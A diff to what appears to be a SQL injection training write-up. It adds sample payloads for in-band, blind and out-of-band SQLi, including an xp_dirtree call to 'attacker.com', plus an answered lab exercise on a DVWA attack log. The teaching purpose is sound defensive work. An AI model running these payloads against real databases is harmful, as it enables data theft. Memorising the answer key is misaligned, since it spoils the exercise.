@@ -6,9 +6,9 @@ The frameworks we use today to develop web applications have preventative mechan
 
 ## Types of SQL Injections
 There are 3 types of SQL Injection. These are: 
-- In-band SQLi (Classic SQLi): When an SQL query is sent and responded to on the same channel, we call this in-band SQLi. This is easier for attackers to exploit than other categories of SQLi.
-- Inferential SQLi (Blind SQLi): SQL queries that receive a response that cannot be seen are called Inferential SQLi. They are also called "Blind SQLi" because the response cannot be seen.
-- Out-of-band SQLi: If the response to an SQL query is communicated through another channel, this type of SQLi is called "out-of-band SQLi". For example, if the attacker receives replies to the SQL queries via DNS, this is called out-of-band SQLi.
+- In-band SQLi (Classic SQLi): When an SQL query is sent and responded to on the same channel, we call this in-band SQLi. This is easier for attackers to exploit than other categories of SQLi. `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';`
+- Inferential SQLi (Blind SQLi): SQL queries that receive a response that cannot be seen are called Inferential SQLi. They are also called "Blind SQLi" because the response cannot be seen. `SELECT * FROM users WHERE id = 1; IF(1=1, SLEEP(5), 0) --;`
+- Out-of-band SQLi: If the response to an SQL query is communicated through another channel, this type of SQLi is called "out-of-band SQLi". For example, if the attacker receives replies to the SQL queries via DNS, this is called out-of-band SQLi. `SELECT * FROM users WHERE id = 1; EXEC xp_dirtree '//attacker.com/abc' --;`
 
 ## How Does SQL Injection Work?
 Today, most standard web applications receive data from a user and use that data to display specific content. The login page is where most SQL injection attacks occur. Let's look at how SQL injections work through an example.
@@ -75,20 +75,22 @@ You can use the following methods to detect SQL injection tools:
 - Check the frequency of requests: Automated tools are designed to send an estimated number of requests per second to test payloads as quickly as possible. A normal user might send 1 request per second, so looking at the number of requests per second will tell you if the requests are from an automated tool or not.
 - Look at the content of the payload: Automated tools usually include their own names in their payloads. For example, an SQL injection payload sent by an automated tool might look like this: sqlmap’ OR 1=1
 - If the payload is complicated: This detection method may not always work, but based on my experience I could say that automated tools send more complicated payloads.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  
 ----
+
+## Questions
+1. Note: Use the "/root/Desktop/QuestionFiles/SQL_Injection_Web_Attacks.rar" file for solving the questions below.<br>
+   Question: What date did the exploitation phase of SQL Injection Attack start?<br>
+   File Password: access<br>
+   Answer Format: 01/Jan/2022:12:00:00<br>
+   As we scroll through the logs, we identify the first suspicious request on `01/Mar/2022:08:35:14`. The request is as follows: `/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit`. Decoding the URL, we get `/dvwa/vulnerabilities/sqli/?id='&Submit=Submit`. <br>`Answer: 01/Mar/2022:08:35:14`
+
+2. What is the IP address of the attacker who performed the SQL Injection attack?<br>
+   `Answer: 192.168.31.167` (Look at the suspicious log and got the IP)
+
+3. Was the SQL Injection attack successful? (Answer Format: Y/N)<br>
+   Examine the response size in the logs. The response size for the SQLi requests ranges from approximately 4500 to 4800 bytes.<br>
+   `Answer: Y` 
+
+4. What is the type of SQL Injection attack? (Classic, Blind, Out-of-band)<br>
+   `Answer: Classic`
